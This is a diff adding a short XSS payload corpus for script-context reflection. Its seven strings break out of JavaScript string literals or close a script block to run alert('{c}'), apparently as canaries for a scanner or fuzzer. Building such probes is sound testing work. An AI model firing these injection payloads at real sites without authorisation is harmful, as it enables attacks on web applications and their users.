@@ -1,0 +1,8 @@
+# XSS payload corpus — script-context reflection (inside <script> block).
+'-alert('{c}')-'
+";alert('{c}');"
+'};alert('{c}');{'
+</script><script>alert('{c}')</script>
+'-eval("alert('{c}')")-'
+"||alert('{c}')||"
+');alert('{c}')//
